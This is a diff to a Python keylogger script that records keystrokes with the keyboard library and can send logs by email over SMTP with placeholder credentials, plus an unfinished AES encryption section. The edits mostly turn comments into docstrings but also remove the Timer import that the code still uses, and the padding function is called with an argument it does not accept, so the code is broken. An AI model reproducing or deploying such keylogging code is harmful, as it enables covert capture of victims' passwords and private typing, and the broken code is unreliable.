@@ -1,15 +1,16 @@
-# KEYLOGGER
+#! bin/python3/keylogger
 
 import keyboard
 import smtplib  # For sending email using SMTP protocol (gmail).
-# Timer is to make a method runs after an 'interval' amount of time.
-from threading import Timer
 from datetime import datetime
-
 from Crypto.Cipher import AES
 import hashlib 
 
-SEND_REPORT_EVERY = 60 # (60 = 1min) / time between reports, change according to your preference
+SEND_REPORT_EVERY = 60
+"""
+    (60 = 1min) /, change according to your preference
+    or change according to time between reports 
+"""
 EMAIL_ADDRESS = 'exemple@notsafe.com'
 EMAIL_PASSWORD = 'notsosafe'
 
@@ -86,8 +87,10 @@ class keylogger:
             self.update_filename()
             if self.report_method == 'file':
                 self.report_to_file()
-                # if you want to print in the console, uncomment below the line
-                # print(f'[{self.filename}] - {self.log}')
+                """
+                    if you want to print in the console, uncomment below the line
+                    print(f'[{self.filename}] - {self.log}')
+                """
                 self.start_dt = datetime.now()
             self.log = ''
             timer = Timer(interval=self.interval, function=self.report)
@@ -108,9 +111,6 @@ class keylogger:
 
 ##### Enrypt ######
 
-# ModuleNotFoundError: No module named 'Crypto'
-
-
 password = ''.encode()    
 key = ''
 mode = AES.MODE_CBC
@@ -122,20 +122,21 @@ def pad_message():
     return
 
 cipher = AES.new(key, mode, IV)
-
 message = ''
 padded_message = pad_message(message)
 
 encrypt = cipher.encrypt(padded_message)
 print(encrypt)
 
+# print(cipher.encrypt(padded_message))
 
 if __name__ == '__main__':
 
     """
-        if you want a keylogger to send to your email
+        if you want a keylogger to send files to you through email:
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-        if you want a keylogger to record keylogs to a local file
+        if you want a keylogger to record keylogs to a local file:
+        keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     """
     keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method='file')
     keylogger.start()
